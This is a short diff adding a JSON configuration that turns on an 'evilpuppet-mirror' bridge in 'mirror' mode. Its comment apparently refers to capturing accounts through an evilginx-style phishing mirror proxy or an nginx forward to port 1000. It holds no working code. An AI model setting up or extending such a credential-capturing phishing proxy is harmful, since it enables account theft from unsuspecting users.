@@ -1,0 +1,8 @@
+{
+  "puppet": {
+    "enabled": true,
+    "mode": "mirror",
+    "bridge": "evilpuppet-mirror",
+    "note": "Evilpuppet-style DOM mirror — accounts via evilginx mirror proxy or nginx→:1000"
+  }
+}
